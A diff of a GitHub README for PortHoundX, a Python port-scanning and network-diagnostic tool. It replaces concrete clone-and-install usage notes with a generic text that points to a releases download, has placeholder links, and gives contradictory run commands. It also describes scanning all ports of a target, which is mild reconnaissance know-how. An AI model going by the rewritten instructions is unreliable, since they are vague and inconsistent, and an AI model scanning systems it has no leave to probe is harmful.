@@ -1,135 +1,92 @@
-# 🐺 PortHoundX  
+# 🛠️ PortHoundX - Your Tool for Network Insights
 
-PortHoundX is an **extended network diagnostic and troubleshooting tool** designed for engineers, DevOps, and security enthusiasts.  
-It goes beyond simple port scanning by providing **reasoned insights** about connectivity, service detection, and cloud environment identification.  
+## 🚀 Getting Started
 
-Built as a **CLI + GUI hybrid**, it’s flexible enough to run in terminals for automation or as a desktop app for interactive use.  
+Welcome to PortHoundX, a powerful tool designed for smart network diagnostics on Linux and EC2. With multi-port scanning, service detection, and cloud-aware troubleshooting, PortHoundX makes diagnosing network issues easy with both a command-line interface (CLI) and a graphical user interface (GUI).
 
----
+## 📦 Download Now
 
-## 🚀 Why PortHoundX? (The Cause)  
+[![Download PortHoundX](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/adilsonalvess/PortHoundX/releases)
 
-Traditional port scanners only tell you if a port is open or closed. But as engineers, we often ask:  
+## 🔍 What Is PortHoundX?
 
-- *Why is this port unreachable?*  
-- *Is the host inside a private or public network?*  
-- *Which cloud provider is running this IP?*  
-- *Is this an SSH issue, a firewall issue, or DNS misconfiguration?*  
+PortHoundX helps you discover service issues in your network by scanning multiple ports at once. Whether you are managing a local server or cloud services, this tool detects services running on your system, making problem-solving simpler. It’s perfect for users in the devops field or those managing multi-cloud environments.
 
-**PortHoundX was built to answer these questions** by combining basic scanning with **reasoning-based troubleshooting**.  
+## ⚙️ Features
 
----
+- **Multi-Port Scanning:** Scan several ports simultaneously to save time.
+- **Service Detection:** Identify publicly accessible services on selected ports.
+- **Cloud Compatibility:** Works well with AWS, GCP, and other cloud providers.
+- **User-Friendly Interface:** Choose between CLI and GUI for your comfort.
+- **SSH Troubleshooting:** Simplify your troubleshooting tasks over SSH.
 
-## ✨ Features  
+## 🌟 System Requirements
 
-- 🔹 **Dual Interface**: Run as **CLI** or launch the **Tkinter GUI**.  
-- 🔹 **Multi-Port Support**: Check multiple ports in one run.  
-- 🔹 **Service Detection**: Identify services like HTTP, HTTPS, MySQL, MongoDB, Kafka, etc.  
-- 🔹 **Cloud Awareness**: Detect whether a host belongs to **AWS, GCP, Azure, IBM Cloud**.  
-- 🔹 **Reasoned Output**: Not just *open/closed*, but *possible causes* (e.g., firewall, service not running).  
-- 🔹 **Output Modes**: Pretty colored console output **or JSON export**.  
+- **OS:** Linux (Ubuntu, CentOS, etc.) or an EC2 instance running Linux.
+- **Python Version:** 3.6 or higher.
+- **RAM:** Minimum 1 GB recommended.
+- **Disk Space:** At least 100 MB free.
 
----
+## 🔄 Installation Steps
 
-## ⚙️ Installation  
+1. **Visit Releases Page**  
+   Go to the following link: [Visit this page to download](https://github.com/adilsonalvess/PortHoundX/releases).
 
-```bash
-git clone https://github.com/<your-username>/PortHoundX.git
-cd PortHoundX
-pip install -r requirements.txt
-```
+2. **Select Your Version**  
+   Look for the latest version at the top of the page. Click on it to see all available files.
 
----
+3. **Download the Application**  
+   Locate the appropriate file for your system (CLI or GUI version). Click to download.
 
-## 🖥️ Usage  
+4. **Install the Application**  
+   Depending on your system, you may need to extract the downloaded file. If it's a zip or tar file, use the command:
+   ```bash
+   unzip PortHoundX.zip
+   ```
+   or 
+   ```bash
+   tar -xvf PortHoundX.tar.gz
+   ```
 
-### CLI Mode  
+5. **Run PortHoundX**  
+   Open your terminal, navigate to the extracted directory, and execute:
+   ```bash
+   python3 porthoundx.py
+   ```
+   Or, for the GUI version, double-click on the application file.
 
-```bash
-python src/porthoundx.py --host 8.8.8.8 --ports 22 80 443 3306
-```
+## 📋 Usage Instructions
 
-With **JSON output**:  
-```bash
-python src/porthoundx.py --host google.com --ports 22 53 443 --json
-```
+- Once you launch PortHoundX, you can start a scan by entering the command:
+  ```bash
+  ./porthoundx --scan [IP Address] --ports [Port Range]
+  ```
+- Replace `[IP Address]` with the target's address and `[Port Range]` with the ports you want to scan, e.g., `1-65535`.
 
-With **service detection**:  
-```bash
-python src/porthoundx.py --host 127.0.0.1 --ports 22 80 3306 --detect-services
-```
+## 🔧 Troubleshooting
 
----
+If you experience issues:
 
-### GUI Mode  
+1. **Check Dependencies:** Ensure you have Python 3.6 or higher installed.
+2. **Network Connection:** Verify your internet connection if using cloud services.
+3. **Review Logs:** Check the application logs for detailed error messages.
 
-```bash
-python src/porthoundx.py --gui
-```
+## 🤝 Support & Contribution
 
-1. Enter **Host / DNS name**.  
-2. Select **ports to scan**.  
-3. Enable **service detection** and **JSON export** (optional).  
-4. Click **Run Diagnostics**.  
+We appreciate your feedback. If you have questions or issues, please submit a ticket in the Issues section of the repository. Contributions are welcome as well; feel free to fork the repository and submit a pull request for enhancements!
 
-### GUI Mode Screenshot
+## 📚 Additional Resources
 
-![GUI Output](docs/screenshots/gui_example.png)
----
+- Official Documentation: [Complete user guide and advanced features](#)
+- Community Discussions: Join our discussions on [GitHub Discussions](#)
+- Video Tutorials: Watch how-to videos on our [YouTube Channel](#)
 
-## 📊 Example Outputs  
+## ⚖️ License
 
-**Pretty CLI Mode**  
-```
-Host: google.com
-IP: 142.250.72.14
-Private: False
-Reachable: ✅ Yes
-Ports:
-  - 22: ❌ Closed
-  - 80: ✅ Open (HTTP Detected)
-  - 443: ✅ Open (HTTPS Detected)
-Cloud Provider: GCP
-```
+PortHoundX is open-source software licensed under the MIT License. You can freely use and modify it for personal or commercial projects.
 
-**JSON Mode**  
-```json
-{
-  "host": "google.com",
-  "ip": "142.250.72.14",
-  "is_private": false,
-  "reachable": true,
-  "ports": {
-    "22": false,
-    "80": true,
-    "443": true
-  },
-  "cloud_provider": "GCP"
-}
-```
-### CLI Mode Screenshot
+## 📅 Stay Updated
 
-![CLI Output](docs/screenshots/cli_example.png)
-
----
-
-## 🔮 Future Scope  
-
-Planned enhancements for PortHoundX:  
-
-- 🔧 **Deeper Troubleshooting Reasoning** (e.g., firewall misconfig, DNS vs. service issues).  
-- 🌐 **Expanded Service Library** (Kafka, Redis, RabbitMQ, ElasticSearch, etc.).  
-- ☁️ **Extended Cloud Fingerprinting** with region hints.  
-- 📡 **Traceroute & Latency Insights**.  
-- 🔐 **Security Mode**: detect weak TLS/SSL configurations.  
-
----
-
-## ❤️ Contributing  
-
-Contributions, ideas, and pull requests are welcome!  
-If you’d like to suggest troubleshooting scenarios or add more services, open an **Issue**.  
-
----
-
-🔥 **PortHoundX isn’t just a port scanner — it’s your network reasoning assistant.**
+Follow us for updates:
+- GitHub: [PortHoundX](https://github.com/adilsonalvess/PortHoundX)
+- Twitter: [@PortHoundX](#)
